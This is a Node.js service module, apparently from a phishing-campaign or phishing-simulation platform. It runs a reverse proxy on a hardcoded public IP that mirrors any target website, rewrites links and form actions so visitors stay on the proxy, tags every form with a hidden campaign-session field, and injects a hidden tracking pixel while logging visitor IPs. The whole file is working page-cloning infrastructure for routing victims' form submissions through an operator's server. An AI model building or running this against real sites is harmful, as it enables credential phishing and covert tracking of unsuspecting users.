const axios = require('axios');
const cheerio = require('cheerio');
const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const db = require('../database');
const crypto = require('crypto');

class WebsiteMirroringService {
  constructor() {
    this.activeSessions = new Map();
    this.proxyServers = new Map();
  }

  /**
   * Create a new website mirroring session for a campaign
   * @param {number} campaignId - Campaign ID
   * @param {string} targetUrl - URL to mirror
   * @returns {Promise<Object>} Mirror session details
   */
  async createMirrorSession(campaignId, targetUrl) {
    try {
      // Find an available port (starting from 8080)
      const proxyPort = await this.findAvailablePort(8080);
      
      // Normalize target URL
      const normalizedUrl = this.normalizeUrl(targetUrl);
      
      // Create session in database
      const sessionId = await new Promise((resolve, reject) => {
        db.run(
          `INSERT INTO WebsiteMirroringSessions 
           (campaign_id, target_url, proxy_port, status) 
           VALUES (?, ?, ?, ?)`,
          [campaignId, normalizedUrl, proxyPort, 'active'],
          function(err) {
            if (err) reject(err);
            else resolve(this.lastID);
          }
        );
      });

      // Start proxy server
      const proxyUrl = await this.startProxyServer(sessionId, normalizedUrl, proxyPort);
      
      // Store session info
      this.activeSessions.set(sessionId, {
        campaignId,
        targetUrl: normalizedUrl,
        proxyPort,
        proxyUrl,
        startTime: new Date()
      });

      console.log(`Website mirroring session created: ${proxyUrl} -> ${normalizedUrl}`);
      
      return {
        sessionId,
        proxyUrl,
        targetUrl: normalizedUrl,
        proxyPort
      };
    } catch (error) {
      console.error('Error creating mirror session:', error);
      throw error;
    }
  }

  /**
   * Start a proxy server for website mirroring
   * @param {number} sessionId - Session ID
   * @param {string} targetUrl - Target URL to mirror
   * @param {number} port - Port to run proxy on
   * @returns {Promise<string>} Proxy URL
   */
  async startProxyServer(sessionId, targetUrl, port) {
    const app = express();
    
    // Middleware to track access
    app.use((req, res, next) => {
      this.trackAccess(sessionId, req);
      next();
    });

    // Create proxy middleware with content modification
    const proxyMiddleware = createProxyMiddleware({
      target: targetUrl,
      changeOrigin: true,
      followRedirects: true,
      selfHandleResponse: true,
      onProxyRes: (proxyRes, req, res) => {
        this.handleProxyResponse(proxyRes, req, res, sessionId, targetUrl);
      },
      onError: (err, req, res) => {
        console.error('Proxy error:', err);
        res.status(500).send('Mirroring service temporarily unavailable');
      }
    });

    app.use('/', proxyMiddleware);

    // Start server
    const server = app.listen(port, () => {
      console.log(`Proxy server running on port ${port} for session ${sessionId}`);
    });

    // Store server reference
    this.proxyServers.set(sessionId, server);

    // Return the proxy URL (using the main server's domain)
    return `http://147.93.87.182:${port}`;
  }

  /**
   * Handle proxy response and modify content if needed
   */
  handleProxyResponse(proxyRes, req, res, sessionId, targetUrl) {
    let body = '';
    
    proxyRes.on('data', (chunk) => {
      body += chunk;
    });

    proxyRes.on('end', () => {
      const contentType = proxyRes.headers['content-type'] || '';
      
      // Copy headers
      Object.keys(proxyRes.headers).forEach(key => {
        res.setHeader(key, proxyRes.headers[key]);
      });

      res.statusCode = proxyRes.statusCode;

      // Modify HTML content to inject tracking and fix links
      if (contentType.includes('text/html')) {
        const modifiedHtml = this.modifyHtmlContent(body, sessionId, targetUrl, req);
        res.end(modifiedHtml);
      } else {
        res.end(body);
      }
    });
  }

  /**
   * Modify HTML content to inject tracking and fix relative links
   */
  modifyHtmlContent(html, sessionId, targetUrl, req) {
    try {
      const $ = cheerio.load(html);
      const session = this.activeSessions.get(sessionId);
      
      if (!session) return html;

      const proxyUrl = session.proxyUrl;
      const baseUrl = new URL(targetUrl);

      // Fix relative links and resources
      $('a[href]').each((i, elem) => {
        const href = $(elem).attr('href');
        if (href && !href.startsWith('#') && !href.startsWith('javascript:')) {
          const absoluteUrl = this.resolveUrl(href, baseUrl);
          if (absoluteUrl.origin === baseUrl.origin) {
            // Internal link - route through proxy
            $(elem).attr('href', absoluteUrl.pathname + absoluteUrl.search + absoluteUrl.hash);
          }
        }
      });

      // Fix images, CSS, and JS resources
      $('img[src], link[href], script[src]').each((i, elem) => {
        const attr = $(elem).attr('src') || $(elem).attr('href');
        if (attr && !attr.startsWith('http') && !attr.startsWith('//')) {
          const absoluteUrl = this.resolveUrl(attr, baseUrl);
          if (absoluteUrl.origin === baseUrl.origin) {
            if ($(elem).attr('src')) {
              $(elem).attr('src', absoluteUrl.pathname + absoluteUrl.search);
            } else {
              $(elem).attr('href', absoluteUrl.pathname + absoluteUrl.search);
            }
          }
        }
      });

      // Inject form submission tracking
      $('form').each((i, elem) => {
        const $form = $(elem);
        const originalAction = $form.attr('action') || '';
        
        // Add hidden field to track form submissions
        $form.append(`<input type="hidden" name="_fstrike_session" value="${sessionId}">`);
        
        // Modify form action if it's a relative URL
        if (originalAction && !originalAction.startsWith('http')) {
          const absoluteUrl = this.resolveUrl(originalAction, baseUrl);
          if (absoluteUrl.origin === baseUrl.origin) {
            $form.attr('action', absoluteUrl.pathname + absoluteUrl.search);
          }
        }
      });

      // Inject tracking pixel for page views
      const trackingPixel = `
        <img src="/api/track-mirror-view/${sessionId}" 
             style="display:none;width:1px;height:1px;" 
             alt="" />
      `;
      $('body').append(trackingPixel);

      return $.html();
    } catch (error) {
      console.error('Error modifying HTML content:', error);
      return html;
    }
  }

  /**
   * Track access to mirrored content
   */
  async trackAccess(sessionId, req) {
    try {
      const timestamp = new Date().toISOString();
      const ip = req.ip || req.connection.remoteAddress;
      const userAgent = req.get('User-Agent') || '';

      // Update last accessed time and increment counter
      db.run(
        `UPDATE WebsiteMirroringSessions 
         SET last_accessed = ?, access_count = access_count + 1 
         WHERE id = ?`,
        [timestamp, sessionId]
      );

      console.log(`Mirror access tracked: Session ${sessionId}, IP: ${ip}, Path: ${req.path}`);
    } catch (error) {
      console.error('Error tracking access:', error);
    }
  }

  /**
   * Stop a mirroring session
   */
  async stopMirrorSession(sessionId) {
    try {
      // Stop proxy server
      const server = this.proxyServers.get(sessionId);
      if (server) {
        server.close();
        this.proxyServers.delete(sessionId);
      }

      // Remove from active sessions
      this.activeSessions.delete(sessionId);

      // Update database
      await new Promise((resolve, reject) => {
        db.run(
          `UPDATE WebsiteMirroringSessions 
           SET status = 'inactive' 
           WHERE id = ?`,
          [sessionId],
          (err) => {
            if (err) reject(err);
            else resolve();
          }
        );
      });

      console.log(`Mirror session ${sessionId} stopped`);
    } catch (error) {
      console.error('Error stopping mirror session:', error);
      throw error;
    }
  }

  /**
   * Get mirroring session details
   */
  async getMirrorSession(campaignId) {
    return new Promise((resolve, reject) => {
      db.get(
        `SELECT * FROM WebsiteMirroringSessions 
         WHERE campaign_id = ? AND status = 'active' 
         ORDER BY created_at DESC LIMIT 1`,
        [campaignId],
        (err, row) => {
          if (err) reject(err);
          else resolve(row);
        }
      );
    });
  }

  /**
   * Helper methods
   */
  normalizeUrl(url) {
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      url = 'https://' + url;
    }
    return url.endsWith('/') ? url.slice(0, -1) : url;
  }

  resolveUrl(url, baseUrl) {
    try {
      return new URL(url, baseUrl.href);
    } catch {
      return baseUrl;
    }
  }

  async findAvailablePort(startPort) {
    const net = require('net');
    
    const isPortAvailable = (port) => {
      return new Promise((resolve) => {
        const server = net.createServer();
        server.listen(port, () => {
          server.close(() => resolve(true));
        });
        server.on('error', () => resolve(false));
      });
    };

    let port = startPort;
    while (!(await isPortAvailable(port))) {
      port++;
      if (port > startPort + 100) {
        throw new Error('No available ports found');
      }
    }
    return port;
  }

  /**
   * Clean up inactive sessions
   */
  async cleanupSessions() {
    try {
      // Stop sessions that haven't been accessed in 24 hours
      const cutoffTime = new Date(Date.now() - 24 * 60 * 60 * 1000);
      
      const inactiveSessions = await new Promise((resolve, reject) => {
        db.all(
          `SELECT id FROM WebsiteMirroringSessions 
           WHERE status = 'active' 
           AND (last_accessed IS NULL OR last_accessed < ?)`,
          [cutoffTime.toISOString()],
          (err, rows) => {
            if (err) reject(err);
            else resolve(rows);
          }
        );
      });

      for (const session of inactiveSessions) {
        await this.stopMirrorSession(session.id);
      }

      console.log(`Cleaned up ${inactiveSessions.length} inactive mirroring sessions`);
    } catch (error) {
      console.error('Error cleaning up sessions:', error);
    }
  }
}

module.exports = new WebsiteMirroringService();